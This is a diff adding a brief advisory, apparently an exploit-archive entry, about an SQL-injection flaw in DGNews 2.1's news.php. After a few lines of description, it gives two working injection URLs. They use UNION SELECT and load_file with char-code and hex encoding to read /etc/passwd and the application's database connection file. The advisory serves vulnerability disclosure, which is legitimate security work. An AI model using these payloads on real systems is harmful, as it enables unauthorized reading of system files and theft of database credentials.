@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/24212/info
+
+DGNews is prone to an SQL-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in an SQL query.
+
+Successful exploits could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database.
+
+DGNews 2.1 is reported vulnerable; other versions may also be affected. 
+
+http://www.example.com/news.php?go=fullnews&newsid=-9+union+select+1,2,load_file(char(47,101,116,99,47,112,97,115,115,119,100)),4,5,6,7%20from%2
+0news_comment
+http://www.example.com/news.php?go=fullnews&newsid=-9+union+select+1,2,load_file(0x2F7573722F6C6F63616C2F617061636865322F6874646F63732F64676E657
+7732F61646D696E2F636F6E6E2E706870),4,5,6,7%20from%20news_comment 
